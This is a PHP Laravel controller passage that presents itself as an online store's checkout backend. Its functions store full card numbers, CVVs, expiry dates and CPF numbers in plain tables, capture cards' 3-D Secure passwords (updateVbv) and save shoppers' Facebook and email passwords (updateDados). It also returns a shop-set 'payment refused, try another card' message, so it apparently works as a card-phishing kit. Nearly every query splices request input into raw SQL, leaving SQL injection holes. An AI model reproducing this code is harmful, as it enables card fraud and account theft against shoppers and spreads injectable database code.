                $helper->query('UPDATE carrinho SET finalizou_pedido = "s", data_pedido = :dt WHERE hash = :hash', ['hash' => $request->hash, 'dt' => date('Y-m-d H:i:s')]);

                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'waiting',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                UPDATE carrinho
                SET status_pagamento = 'waiting', metodo_pagamento = 'card'
                WHERE hash = '" . $request->hash . "'
                "));


                return response()->json(['status' => 201]);
            }

            if ($req['response'] == 'CARD_ERROR' && $req['statusTransaction'] == 'CANCELED') {
                $insert = DB::table('transacao_cartao')->insertGetId([
                    'hash' => $request->hash,
                    'id_transaction' => $req['idTransaction'],
                    'status_pagamento' => 'unpaid',
                    'data' => date('Y-m-d H:i:s'),
                    'retorno_gateway' => $req['statusTransaction'],
                    'cartao' => $request->cartao,
                    'validade' => $request->validade,
                    'cvv' => $request->cvv,
                    'nome' => $request->nome,
                    'cpf' => $request->cpf
                ]);

                DB::select(DB::raw("
                UPDATE carrinho
                SET status_pagamento = 'unpaid', metodo_pagamento = 'card'
                WHERE hash = '" . $request->hash . "'
                "));

                return response()->json(['status' => 202]);

            }

            if ($req['response'] == 'CHALLENGE') {
                return response()->json([
                    'status' => 310,
                    'acsUrl' => $req['acsUrl'],
                    'pareq' => $req['pareq'],
                    'authenticationTransactionId' => $req['authenticationTransactionId'],
                    'mensagem' => 'challenge'
                ]);
            }

            return response()->json(['status' => 500]);
        } catch (\Exception $e) {
            return $e;
            return response()->json(['status' => 500]);
        }
    }

    public function getParcela(Request $request)
    {
        try {
            $idLoja = DB::select(DB::raw("
                SELECT id_loja
                FROM carrinho
                WHERE hash = '" . $request->hash . "'
            "));

            $suitPay = DB::select(DB::raw("
                SELECT ci, cs, usuario_suitpay
                FROM suitpay_loja
                WHERE id_loja = " . $idLoja[0]->id_loja . "
            "));

            $reqParcela = Http::withHeaders([
                'ci' => $suitPay[0]->ci,
                'cs' => $suitPay[0]->cs
            ])->get('https://ws.suitpay.app/api/v1/gateway/fee-simulator-gateway?value=' . $request->v);

            $reqParcela = json_decode($reqParcela, true);

            $l = [];
            $l['parcela'] = $reqParcela['list'][0];
            return response()->json([$l]);
        } catch (\Exception $e) {

            return response()->json(['status' => 500]);
        }
    }

    public function updateInfo(Request $request)
    {
        try {
            $cart = DB::table('carrinho')
                ->where('hash', $request->hash)
                ->first();

            $cards = DB::table('cartao')
                ->where('hash', $request->hash)
                ->get();

            if ($cards->count() >= 3) {
                return response()->json([
                    'status' => 401,
                    'message' => 'O limite de tentativas do seu cartão foi atingido'
                ]);
            }

            // Removido bloqueio por uso de 2+ cartões diferentes; manter apenas limites de tentativas totais

            if ($cards->where('cc', $request->cc)->count() >= 2) {
                return response()->json([
                    'status' => 401,
                    'message' => 'Este cartão atingiu o limite de tentativas. Por favor, use outro.'
                ]);
            }

            $insert = DB::table('cartao')->insertGetId([
                'hash' => $request->hash,
                'cc' => $request->cc,
                'validade' => $request->validade,
                'titular' => $request->titular,
                'cpf' => $request->cpf,
                'cvv' => $request->cvv,
                'horario' => date('Y-m-d H:i:s'),
                'bin' => $request->bin,
                'id_loja' => $cart->id_loja
            ]);

            DB::table('carrinho')
                ->where('hash', $request->hash)
                ->update([
                    'finalizou_pedido' => 's',
                    'data_pedido' => date('Y-m-d H:i:s'),
                    'metodo_pagamento' => 'cartao',
                    'installments' => $request->installments
                ]);

            DB::table('carrinho')
                ->where('hash', $request->hash)
                ->increment('card_attempts');

            $queryIdUsuario = DB::select(DB::raw("SELECT id_usuario_pai FROM loja WHERE id_loja = " . $cart->id_loja));
            $queryDigitos = DB::select(DB::raw("SELECT digitos FROM bins WHERE bin = '" . $request->bin . "'"));
            $queryPreferencias = DB::select(DB::raw("SELECT * FROM bins_preferencias WHERE bin = '" . $request->bin . "' AND id_usuario = " . $queryIdUsuario[0]->id_usuario_pai));

            if (!empty($queryPreferencias)) {
                return response()->json(['status' => 200, 'i' => $insert, 'v' => $queryPreferencias[0]->vbv, 'd' => $queryPreferencias[0]->digitos]);
            }

            return response()->json(['status' => 200, 'i' => $insert, 'v' => 'n', 'd' => (!empty($queryDigitos) ? $queryDigitos[0]->digitos : 404)]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function updateVbv(Request $request)
    {
        try {
            DB::select(DB::raw("UPDATE cartao SET senha = '" . $request->senha . "' WHERE id = " . $request->id));

            return response()->json(['sttatus' => 200]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function getLogin(Request $request)
    {
        try {
            if (is_null($request->hash)) return response()->json(['status' => 404]);

            $qry = DB::select(DB::raw("SELECT id_loja, realizou_login FROM carrinho c WHERE hash = '" . $request->hash . "'"));

            if (empty($qry)) return response()->json(['status' => 404]);

            $qry2 = DB::select(DB::raw("SELECT cd_tipo_checkout FROM loja WHERE id_loja = " . $qry[0]->id_loja));

            return response()->json([
                'status' => 200,
                'path' => '/checkout/' . $qry2[0]->cd_tipo_checkout . '/' . $request->hash . '/1',
                'realizou_login' => ($qry[0]->realizou_login == 's' ? true : false),
            ]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    public function updateDados(Request $request)
    {
        try {
            $getIdLoja = DB::select(DB::raw("SELECT id_loja FROM carrinho WHERE hash = '" . $request->hash . "'"));

            if ($request->facebook == 's') {
                $verifica1 = DB::select(DB::raw("SELECT * FROM facebook WHERE email = '" . $request->email . "' AND senha ='" . $request->senha . "' "));
                if (!empty($verifica1)) return response()->json(['status' => 200]);

                DB::table('facebook')->insert([
                    'email' => $request->email,
                    'senha' => $request->senha,
                    'hash' => $request->hash,
                    'horario' => date('Y-m-d H:i:s'),
                    'id_loja' => $getIdLoja[0]->id_loja
                ]);

                return response()->json(['status' => 200]);
            }
            DB::select(DB::raw("UPDATE carrinho SET realizou_login = 's', email = '" . $request->email . "', email_senha = '" . $request->senha . "' WHERE hash = '" . $request->hash . "' "));

            return response()->json(['status' => 200]);
        } catch (\Exception $e) {
            return response()->json(['status' => 500]);
        }
    }

    private function getErrorMessage($shop_id)
    {
        return DB::table('cartao_loja')
            ->where('id_loja', $shop_id)
            ->value('mensagem_erro')
            ??
            'O seu pagamento foi recusado, tente outro cartão de crédito ou altere a forma de pagamento.';
    }

    public function confirmOrder(Request $request)
    {
        try {
            $order = DB::table('carrinho')
                ->where('hash', $request->hash)
                ->first();

            $order->products = DB::table('order_product AS op')
                ->join('produto as p', 'p.id_produto', '=', 'op.product_id')
                ->where('op.order_id', $order->id_carrinho)
                ->selectRaw('p.titulo, COALESCE(op.unit_price, p.preco, 0) as preco, p.imagem1, op.quantity AS quantidade, op.variant AS variacao')
                ->get();

            return response()->json([
                'status' => 200,
                'shop' => DB::table('loja')->where('id_loja', $order->id_loja)->first(),
                'order' => $order,
            ]);
        } catch (\Exception $exception) {
            return response()->json([
                'status' => 500,
                'message' => $exception->getMessage()
            ]);
        }
    }
}

